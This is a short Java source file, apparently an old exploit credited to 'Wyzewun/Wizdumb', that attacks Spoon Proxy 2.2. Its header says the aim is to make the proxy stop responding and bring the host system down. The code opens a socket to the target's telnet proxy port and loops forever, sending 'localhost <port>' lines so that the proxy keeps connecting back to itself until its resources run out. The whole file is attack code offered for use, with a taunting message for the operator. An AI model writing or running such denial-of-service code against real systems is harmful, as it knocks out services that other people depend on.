/* forkspoon.java By Wyzewun/Wizdumb [www.mdma.za.net / wizdumb@leet.org]
 *
 * Simple code to cause Spoon Proxy to stop responding, and eventually cause
 * the system to become dangerously low in resources and die. Code tested on
 * version 2.2 on Windoze 98 and all versions assumed vulnerable.
 */

import java.io.*;
import java.net.*;

class forkspoon {
 static void main(String[] args) throws IOException {
  if (args.length != 2) {
    System.out.println("Syntax: java forkspoon [hostname/ip] [port of telnet proxy]");
    System.exit(1); }
  Socket soq = new Socket(args[0], Integer.parseInt(args[1]));
  PrintWriter out = new PrintWriter(soq.getOutputStream(), true);
  System.out.println("Press Control-C when you feel emotionally fufilled :)");
  for (;;) out.println("localhost " + args[1]); } }